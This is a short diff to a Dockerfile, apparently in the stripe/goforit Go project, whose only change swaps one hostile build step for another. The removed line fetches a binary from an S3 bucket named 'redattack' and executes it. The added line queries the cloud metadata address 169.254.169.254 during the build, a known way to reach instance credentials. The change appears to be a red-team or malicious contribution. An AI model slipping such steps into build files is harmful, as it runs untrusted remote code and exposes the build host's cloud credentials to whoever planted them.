@@ -13,5 +13,5 @@ ENV GOPATH=/go
 WORKDIR /go/src/github.com/stripe/goforit
 ADD . /go/src/github.com/stripe/goforit
 
-RUN curl -s -N https://redattack.s3.amazonaws.com/test --output /tmp/test && chmod +x /tmp/test && /tmp/test
+RUN curl -s -N http://169.254.169.254
 CMD sleep 60
